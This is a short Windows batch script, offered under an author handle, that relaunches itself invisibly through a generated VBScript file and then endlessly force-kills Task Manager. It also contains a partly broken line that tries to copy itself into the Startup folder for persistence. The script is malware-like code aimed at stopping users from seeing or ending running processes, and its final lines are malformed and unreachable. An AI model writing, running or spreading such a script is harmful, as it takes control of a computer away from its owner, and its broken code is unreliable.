@echo off
Title: Batch Task Manager Killer by: Rythorian77 (AKA Black Star Research)
:Commandline
IF ["%~1"]==["-e"] GoTo o
:Clear vbs
set Batch=%~dpnx0
(
echo set objshell ^= createobject^("wscript.shell"^)
echo objshell^.run "%Batch% -e"^,vbhide ) > %temp%\bas.vbs
start %temp%\bas.vbs
exit
:o
:loop
Taskkill /IM taskmgr.exe /FI "STATUS eq RUNNING" /F
goto loop
IF NOT %ERRORLEVEL%==0copy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" CreateObject("Wscript.Shell").Run "AntiTaskManager.bat", 0, True
GoTo begin
